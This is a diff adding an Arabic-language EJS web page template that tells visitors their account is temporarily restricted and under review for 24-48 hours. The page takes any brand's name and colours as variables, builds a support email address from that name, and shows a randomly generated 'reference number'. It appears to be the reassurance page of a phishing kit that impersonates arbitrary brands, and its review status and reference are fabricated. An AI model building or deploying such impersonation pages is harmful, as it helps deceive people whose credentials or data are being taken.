@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><%= pageContent.page_title %> — <%= tpl.name %></title>
+<style>
+:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:var(--card);border-radius:16px;padding:40px 32px;max-width:440px;width:100%;text-align:center;box-shadow:0 8px 32px #00000040}
+.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:24px;display:block}
+.lock-icon{font-size:56px;margin-bottom:16px;display:block}
+h1{font-size:1.3rem;margin-bottom:10px}
+.sub{font-size:.9rem;opacity:.6;line-height:1.7;margin-bottom:28px}
+.status-box{background:#ffffff08;border-radius:12px;padding:16px 20px;text-align:right;margin-bottom:24px}
+.status-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #ffffff08;font-size:.86rem}
+.status-row:last-child{border-bottom:none}
+.status-row .val{opacity:.5}
+.status-row .pending{color:#f59e0b}
+.ref{font-size:.78rem;opacity:.35;margin-top:16px;font-family:monospace}
+</style>
+</head>
+<body>
+<div class="card">
+  <span class="brand-logo"><%= tpl.name %></span>
+  <span class="lock-icon">🔒</span>
+  <h1><%= pageContent.headline || 'الحساب محدود مؤقتاً' %></h1>
+  <p class="sub"><%= pageContent.subheadline || 'جارٍ مراجعة معلوماتك. سيتم إعادة تفعيل حسابك خلال 24-48 ساعة.' %></p>
+
+  <div class="status-box">
+    <div class="status-row">
+      <span>الحالة</span>
+      <span class="pending">قيد المراجعة ⏳</span>
+    </div>
+    <div class="status-row">
+      <span>وقت المراجعة المتوقع</span>
+      <span class="val">24-48 ساعة</span>
+    </div>
+    <div class="status-row">
+      <span>التواصل</span>
+      <span class="val">support@<%= tpl.name.toLowerCase().replace(/\s/g,'') %>.com</span>
+    </div>
+  </div>
+
+  <p class="ref">رقم المرجع: REV-<%= Math.random().toString(36).substr(2,8).toUpperCase() %></p>
+</div>
+</body>
+</html>
